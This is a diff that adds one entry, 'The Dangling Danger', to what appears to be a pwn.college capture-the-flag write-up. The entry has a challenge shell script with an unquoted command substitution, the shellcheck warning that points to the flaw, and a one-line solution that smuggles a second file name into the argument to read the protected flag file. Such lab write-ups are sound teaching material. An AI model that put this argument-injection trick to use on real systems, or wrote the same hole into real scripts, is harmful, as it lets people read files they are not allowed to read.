@@ -285,5 +285,28 @@ tar cvf /tmp/backup "$BACKUP_DIR"
 ```
 
 
+## The Dangling Danger
+```sh
+#!/usr/bin/env -iS /opt/pwn.college/bash
+
+PATH=/bin
+
+[[ "$1" = *flag ]] && exit 1
+cat /$(basename "$1")
+```
+
+### Vulnerability
+- shellcheck says:
+```sh
+cat /$(basename "$1")
+^-- SC2046 (warning): Quote this to prevent word splitting.
+```
+
+### Solution
+```sh
+/challenge/run "flag o"
+```
+
+
 
 
